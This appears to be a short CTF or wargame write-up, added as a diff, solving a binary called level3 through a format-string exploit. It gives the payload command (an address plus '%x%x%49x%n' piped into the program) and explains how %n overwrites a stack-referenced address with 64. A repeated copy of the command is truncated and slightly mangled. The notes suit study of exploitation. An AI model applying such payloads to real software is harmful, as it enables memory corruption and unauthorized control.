@@ -1,0 +1,12 @@
+python -c "print '\x8c\x98\x04\x08' + '%x%x%49x' + '%n' " > /tmp/ok && ./level3  < /tmp/ok
+
+https://www.exploit-db.com/docs/english/28476-linux-format-string-exploitation.pdf
+
+The insecure part is the taking the format of printf from input of fgets
+
+Thus one can use %n to fill the address of the next address present on the stack at this moment by the amount of characters previously written by the function:
+
+
+print '\x8c\x98\x04\x08' + '%x%x%49x' + '%n' " > /tmp/ok && ./le    vel3  < /tmp/ok
+
+the address 0x0804988c can be accessed as the 4th byte on the stack, as the start of this very formatting string,  so we write 64 bytes and pop the 3 first bytes, then use %n to write 64 in it.
